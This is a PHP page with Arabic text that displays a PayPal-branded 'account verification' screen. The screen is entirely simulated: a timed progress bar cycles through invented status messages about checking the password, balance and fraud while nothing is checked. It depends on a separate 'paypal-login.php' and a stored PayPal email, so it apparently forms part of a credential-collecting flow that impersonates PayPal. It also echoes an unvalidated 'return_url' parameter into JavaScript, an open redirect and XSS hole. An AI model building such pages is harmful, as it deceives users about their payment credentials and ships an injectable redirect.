<?php
require_once 'includes/init.php';
require_once 'includes/functions.php';

// التحقق من وجود بيانات PayPal في الجلسة
if (!isset($_SESSION['paypal_verified']) || $_SESSION['paypal_verified'] !== true) {
    redirect('paypal-login.php');
}

// الحصول على URL العودة من الاستعلام
$return_url = $_GET['return_url'] ?? 'payment-methods.php';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من حساب PayPal</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            background-color: #f5f7fa;
            font-family: Arial, sans-serif;
        }
        .loading-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 30px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .paypal-logo {
            width: 150px;
            margin: 0 auto 20px;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border-left-color: #0070ba;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #e9ecef;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background-color: #0070ba;
            border-radius: 5px;
            width: 0%;
            transition: width 0.5s;
        }
    </style>
</head>
<body>
    <div class="container mx-auto px-4 py-12">
        <div class="loading-container">
            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="paypal-logo">
            <h1 class="text-xl font-bold mb-4">جاري التحقق من حسابك</h1>
            <p class="text-gray-600 mb-6">يرجى الانتظار بينما نتحقق من بيانات حسابك في PayPal...</p>

            <div class="spinner"></div>

            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>

            <p class="text-gray-500 text-sm" id="status-text">جاري الاتصال بخوادم PayPal...</p>
        </div>
    </div>

    <script>
        // تحديث شريط التقدم
        const progressBar = document.getElementById('progress');
        const statusText = document.getElementById('status-text');
        const statusMessages = [
            'جاري الاتصال بخوادم PayPal...',
            'جاري التحقق من بيانات الحساب...',
            'جاري التحقق من صحة البريد الإلكتروني...',
            'جاري التحقق من صحة كلمة المرور...',
            'جاري التحقق من الأمان...',
            'جاري فحص نشاط الحساب...',
            'جاري التحقق من المعاملات السابقة...',
            'جاري التحقق من رصيد الحساب...',
            'جاري إنشاء جلسة آمنة...',
            'جاري تحليل بيانات الحساب...',
            'جاري التحقق من الاحتيال...',
            'جاري إعداد بيانات الحساب...',
            'اكتمل التحقق بنجاح!'
        ];

        let progress = 0;
        let messageIndex = 0;

        // تحديث شريط التقدم كل 500 مللي ثانية
        const interval = setInterval(() => {
            progress += 0.8;
            progressBar.style.width = `${progress}%`;

            // تحديث النص كل 8%
            if (progress >= (messageIndex + 1) * 8 && messageIndex < statusMessages.length - 1) {
                messageIndex++;
                statusText.textContent = statusMessages[messageIndex];
            }

            // عند اكتمال التقدم، إعادة التوجيه إلى صفحة العودة
            if (progress >= 100) {
                clearInterval(interval);
                statusText.textContent = statusMessages[statusMessages.length - 1];
                setTimeout(() => {
                    // تأكد من أن بيانات PayPal موجودة في الجلسة
                    <?php if (isset($_SESSION['paypal_email']) && isset($_SESSION['paypal_verified'])): ?>
                    window.location.href = '<?php echo $return_url . '?paypal_success=1&add_paypal=1'; ?>';
                    <?php else: ?>
                    window.location.href = '<?php echo $return_url . '?paypal_success=0&error=session_lost'; ?>';
                    <?php endif; ?>
                }, 1500);
            }
        }, 400);
    </script>
</body>
</html>
